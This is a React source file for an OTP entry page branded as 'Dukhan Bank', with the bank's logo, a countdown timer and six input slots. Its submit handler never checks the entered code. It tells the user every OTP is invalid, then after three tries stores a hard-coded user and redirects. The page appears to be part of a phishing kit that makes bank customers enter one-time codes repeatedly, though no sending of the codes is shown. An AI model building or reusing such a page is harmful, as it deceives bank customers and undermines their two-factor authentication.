import React, { useState, useEffect } from "react";
import { Globe, HelpCircle, Loader2 } from "lucide-react";
import { useNavigate } from "react-router-dom";
import Logo from "../assets/Logo.png";
import { toast } from "react-toastify";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp"; // shadcn/ui OTP

const EXPIRYOTP = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes
  const [attempts, setAttempts] = useState(0);

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => t - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const handleSubmit = () => {
    const newAttempts = attempts + 1;
    setAttempts(newAttempts);

    if (newAttempts >= 3) {
      toast.error("Maximum attempts reached. Redirecting...");
      setLoading(true);
      setTimeout(() => {
        localStorage.setItem("user", JSON.stringify({ id: "customer123" }));
        setLoading(false);
        navigate("/");
      }, 1200);
    } else {
      toast.error(`Invalid OTP. Attempts left: ${3 - newAttempts}`);
    }
  };

  return (
    <div className="min-h-[90vh] flex flex-col items-center justify-center bg-gray-50 p-6">
      {/* Top Bar */}
      <div className="flex justify-between w-full max-w-sm mb-4 text-gray-500">
        <HelpCircle className="w-6 h-6" />
        <Globe className="w-6 h-6" />
      </div>

      {/* Logo */}
      <div className="flex flex-col items-center">
        <img src={Logo} alt="Dukhan Bank" className="h-12 mb-2" />
      </div>

      {/* OTP Form */}
      <div className="w-full max-w-sm mt-6">
        <h2 className="text-xl font-semibold mb-2 text-center">Enter OTP</h2>
        <p className="text-gray-600 text-sm mb-6 text-center">
          Please enter the 6-digit OTP sent to your registered mobile number.
        </p>

        {/* OTP Input */}
        <div className="flex justify-center mb-6">
          <InputOTP maxLength={6} value={otp} onChange={setOtp}>
            <InputOTPGroup>
              {[...Array(6)].map((_, i) => (
                <InputOTPSlot key={i} index={i} />
              ))}
            </InputOTPGroup>
          </InputOTP>
        </div>

        {/* Timer */}
        <p className="text-center text-sm text-gray-500 mb-4">
          Time left: {Math.floor(timeLeft / 60)}:
          {(timeLeft % 60).toString().padStart(2, "0")}
        </p>

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold flex items-center justify-center disabled:bg-gray-300"
        >
          {loading ? <Loader2 className="animate-spin w-5 h-5" /> : "Submit"}
        </button>
      </div>
    </div>
  );
};

export default EXPIRYOTP;
